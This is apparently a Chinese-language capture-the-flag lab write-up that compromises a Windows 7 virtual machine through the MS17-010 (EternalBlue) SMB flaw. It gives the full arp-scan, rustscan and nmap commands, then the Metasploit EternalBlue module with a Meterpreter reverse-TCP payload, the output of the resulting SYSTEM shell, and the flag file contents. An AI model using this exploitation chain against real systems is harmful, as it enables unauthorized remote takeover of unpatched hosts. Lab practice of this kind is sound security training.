# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.132 08:00:27:03:82:a3       PCS Systemtechnik GmbH
...
```

发现目标主机：`192.168.205.132`

## 1.2 端口扫描

使用 `rustscan` 进行端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.132
...
Open 192.168.205.132:135
Open 192.168.205.132:139
Open 192.168.205.132:445
```

发现开放端口：

- **135/tcp**：RPC端点映射器
- **139/tcp**：NetBIOS会话服务
- **445/tcp**：SMB服务

根据端口特征判断这是一台Windows主机，且开放了SMB服务。

# 二、漏洞扫描

## 2.1 SMB漏洞扫描

使用 `nmap` 的漏洞脚本扫描SMB服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.132
...
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|         
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
...
```

**重要发现**：目标主机存在 **MS17-010（永恒之蓝）** 漏洞！

# 三、漏洞利用

## 3.1 启动Metasploit Framework

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ msfconsole
...
msf >
```

## 3.2 搜索MS17-010相关模块

```bash
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   ...
```

## 3.3 配置和执行EternalBlue攻击

选择EternalBlue模块并配置参数：

```bash
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/ms17_010_eternalblue) > show options
...
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.205.132
RHOSTS => 192.168.205.132

msf exploit(windows/smb/ms17_010_eternalblue) > run
```

## 3.4 攻击执行过程

```bash
[*] Started reverse TCP handler on 192.168.205.128:4444 
[*] 192.168.205.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.205.132:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.205.132:445 - The target is vulnerable.
[*] 192.168.205.132:445 - Connecting to target for exploitation.
[+] 192.168.205.132:445 - Connection established for exploitation.
[+] 192.168.205.132:445 - Target OS selected valid for OS indicated by SMB reply
...
[+] 192.168.205.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.205.132:445 - Sending egg to corrupted connection.
[*] 192.168.205.132:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.205.132
[*] Meterpreter session 1 opened (192.168.205.128:4444 -> 192.168.205.132:49159)
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

**攻击成功！**获得了Meterpreter会话，表明已经获取了系统最高权限。

# 四、系统访问与信息收集

## 4.1 获取系统Shell

```bash
meterpreter > shell
Process 1376 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

确认获得了Windows 7系统的SYSTEM权限访问。

## 4.2 查找Flag文件

在用户目录中递归搜索txt文件：

```bash
C:\Users>dir *.txt /S
...
 Directory of C:\Users\Admin\Desktop
03/28/2024  06:51 PM                32 admin.txt.txt

 Directory of C:\Users\Lola\Desktop
03/28/2024  06:54 PM                32 user.txt
...
```

发现两个关键文件：

- 管理员Flag：`C:\Users\Admin\Desktop\admin.txt.txt`
- 用户Flag：`C:\Users\Lola\Desktop\user.txt`

## 4.3 获取Flag

```bash
C:\Users>type C:\Users\Lola\Desktop\user.txt
13e624146d31ea232c850267c2745caa

C:\Users>type C:\Users\Admin\Desktop\admin.txt.txt
ff4ad2daf333183677e02bf8f67d4dca
```

成功获取用户和管理员Flag！